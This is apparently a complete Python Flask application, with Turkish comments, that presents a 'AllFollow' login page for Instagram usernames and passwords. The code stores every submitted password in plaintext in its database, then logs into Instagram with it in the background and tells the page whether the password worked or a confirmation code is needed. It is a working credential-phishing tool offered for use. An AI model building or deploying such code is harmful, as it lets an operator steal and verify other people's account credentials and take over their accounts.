import os
import threading
import time
import socket
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword
from dotenv import load_dotenv

load_dotenv()

# Soket seviyesinde timeout ayarı (Sistemin donmasını engeller)
socket.setdefaulttimeout(15)

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(100), default="Bekliyor")

def attempt_login(u, p):
    with app.app_context():
        cl = Client()
        # En hızlı ve en hafif cihaz ayarı
        cl.set_device_settings({"app_version": "269.0.0.18.75"})
        
        acc = IGAccount.query.filter_by(username=u).first()
        try:
            # Giriş denemesi - Donmayı önlemek için thread içinde
            if cl.login(u, p):
                acc.status = "AKTIF"
            else:
                acc.status = "REDDEDILDI"
            db.session.commit()
        except ChallengeRequired:
            acc.status = "ONAY_GEREKIYOR"
            db.session.commit()
        except BadPassword:
            acc.status = "HATALI_SIFRE"
            db.session.commit()
        except Exception:
            # Bağlantı takılırsa veya IP engelliyse buraya düşer
            acc.status = "IP_ENGELI"
            db.session.commit()

@app.route('/')
def index():
    return render_template_string(HTML_BODY)

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    acc = IGAccount.query.filter_by(username=u).first()
    if not acc:
        acc = IGAccount(username=u, password=p, status="BAGLANIYOR")
        db.session.add(acc)
    else:
        acc.status = "BAGLANIYOR"
        acc.password = p
    db.session.commit()
    
    threading.Thread(target=attempt_login, args=(u, p)).start()
    return jsonify(status="ok")

@app.route('/api/status/<u>')
def status(u):
    acc = IGAccount.query.filter_by(username=u).first()
    return jsonify(status=acc.status if acc else "YOK")

HTML_BODY = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>AllFollow</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #a855f7; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="bg-black text-white flex items-center justify-center min-h-screen">
    <div class="bg-zinc-900 p-10 rounded-[2.5rem] border border-zinc-800 w-full max-w-sm text-center">
        <h1 class="text-3xl font-black text-purple-600 italic mb-8 uppercase">ALLFOLLOW</h1>
        
        <div id="login-form">
            <input id="u" placeholder="Kullanıcı Adı" class="w-full bg-zinc-800 p-4 rounded-2xl mb-4 outline-none">
            <input id="p" type="password" placeholder="Şifre" class="w-full bg-zinc-800 p-4 rounded-2xl mb-8 outline-none">
            <button onclick="start()" class="w-full bg-purple-600 py-4 rounded-2xl font-bold">GİRİŞ YAP</button>
        </div>

        <div id="loading-area" class="hidden">
            <div class="loader mx-auto mb-6"></div>
            <p id="status-msg" class="font-bold text-lg">Sistem Yanıt Bekliyor...</p>
            <p class="text-xs text-zinc-500 mt-4">Instagram 15 saniye içinde yanıt vermezse otomatik iptal edilecektir.</p>
        </div>
    </div>

    <script>
        function start() {
            const u = document.getElementById('u').value, p = document.getElementById('p').value;
            if(!u || !p) return;

            document.getElementById('login-form').classList.add('hidden');
            document.getElementById('loading-area').classList.remove('hidden');

            fetch('/api/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u, p})
            });

            const checker = setInterval(async () => {
                const res = await fetch('/api/status/' + u);
                const data = await res.json();
                const msg = document.getElementById('status-msg');

                if(data.status === "AKTIF") {
                    clearInterval(checker);
                    msg.innerText = "GİRİŞ BAŞARILI! ✅"; msg.classList.add('text-green-500');
                } else if(data.status === "IP_ENGELI") {
                    clearInterval(checker);
                    msg.innerText = "IP ENGELİ / TIMEOUT! 🚫"; msg.classList.add('text-red-500');
                } else if(data.status === "HATALI_SIFRE") {
                    clearInterval(checker);
                    msg.innerText = "ŞİFRE YANLIŞ! ❌"; msg.classList.add('text-red-500');
                } else if(data.status === "ONAY_GEREKIYOR") {
                    clearInterval(checker);
                    msg.innerText = "ONAY KODU GEREKLİ! ⚠️"; msg.classList.add('text-yellow-500');
                }
            }, 3000);
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
